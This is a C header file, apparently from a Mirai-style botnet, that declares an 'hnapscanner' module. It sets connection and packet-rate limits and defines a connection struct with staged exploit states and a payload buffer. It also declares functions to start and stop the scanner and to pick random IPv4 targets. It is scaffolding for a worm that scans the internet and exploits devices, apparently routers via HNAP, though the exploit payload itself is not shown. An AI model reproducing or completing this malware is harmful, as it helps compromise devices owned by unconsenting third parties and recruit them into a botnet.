#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef SCAN_MAX
#define hnapscanner_SCANNER_MAX_CONNS 512
#define hnapscanner_SCANNER_RAW_PPS 720
#else
#define hnapscanner_SCANNER_MAX_CONNS 128
#define hnapscanner_SCANNER_RAW_PPS 160
#endif

#ifdef SCAN_MAX
#define hnapscanner_SCANNER_RDBUF_SIZE 1024
#define hnapscanner_SCANNER_HACK_DRAIN 64
#else
#define hnapscanner_SCANNER_RDBUF_SIZE 256
#define hnapscanner_SCANNER_HACK_DRAIN 64
#endif

struct hnapscanner_scanner_connection
{
    int fd, last_recv;
    enum
    {
        hnapscanner_SC_CLOSED,
        hnapscanner_SC_CONNECTING,
        hnapscanner_SC_EXPLOIT_STAGE2,
        hnapscanner_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[hnapscanner_SCANNER_RDBUF_SIZE];
    char payload_buf[1024];
};

void hnapscanner_scanner_init();
void hnapscanner_scanner_kill(void);

static void hnapscanner_setup_connection(struct hnapscanner_scanner_connection *);
static ipv4_t hnapscanner_get_random_ip(void);
